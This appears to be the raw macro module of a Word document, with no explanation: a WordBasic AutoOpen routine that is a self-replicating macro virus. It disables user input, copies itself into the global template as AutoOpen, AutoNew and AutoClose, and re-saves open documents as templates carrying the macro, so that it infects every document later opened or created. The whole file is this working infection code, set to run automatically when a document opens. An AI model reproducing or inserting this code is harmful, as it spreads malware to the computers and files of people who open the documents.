   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Dim nm__()
   Public Sub MAIN()
   ReDim nm__(4)
   Dim nor
   Dim kk
   Dim t
   Dim file$
   Dim filem$
   Dim nor1
   Dim kkk
   Dim tt
   WordBasic.DisableInput 1

   nor = WordBasic.CountMacros(0)
   If nor > 0 Then
       For kk = 1 To nor
           If WordBasic.[MacroName$](kk, 0) = "AutoOpen" Then
           t = 1
           End If
           Next kk

   End If

   file$ = WordBasic.[FileName$]()
   filem$ = file$ + ":AutoOpen"
   If t <> 1 Then
       WordBasic.MacroCopy filem$, "AutoOpen"
       WordBasic.MacroCopy filem$, "AutoNew"
       WordBasic.MacroCopy filem$, "AutoClose"
   End If

   nor1 = WordBasic.CountMacros(1)
   If nor1 > 0 Then
       For kkk = 1 To nor1
           If WordBasic.[MacroName$](kkk, 1) = "AutoOpen" Then
           tt = 1
           End If
           Next kkk

   End If

   If tt <> 1 Then
       WordBasic.FileSaveAs Format:=1
       WordBasic.MacroCopy "AutoOpen", filem$
   End If



   exit_:
   End Sub
